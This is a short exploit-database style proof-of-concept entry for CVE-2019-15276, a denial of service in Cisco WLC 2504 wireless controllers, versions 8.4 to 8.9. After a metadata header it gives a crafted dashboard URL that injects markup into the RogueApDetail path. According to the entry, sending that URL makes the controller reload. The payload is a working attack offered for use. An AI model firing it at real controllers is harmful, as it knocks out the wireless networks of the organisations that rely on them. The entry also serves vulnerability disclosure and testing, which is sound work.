# Exploit Title: Cisco WLC 2504 8.9 - Denial of Service (PoC)
# Google Dork: N/A
# Date: 2019-11-25
# Exploit Author: SecuNinja
# Vendor Homepage: cisco.com
# Software Link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20191106-wlc-dos
# Version: 8.4 to 8.9
# Tested on: not applicable, works independent from OS
# CVE : CVE-2019-15276

# Exploit PoC:

https://WLCIPorHostname/screens/dashboard.html#/RogueApDetail/00:00:00:00:00:00">'><img src="xxxxx">

# Firing this code will cause the system to reload which results in a DoS condition.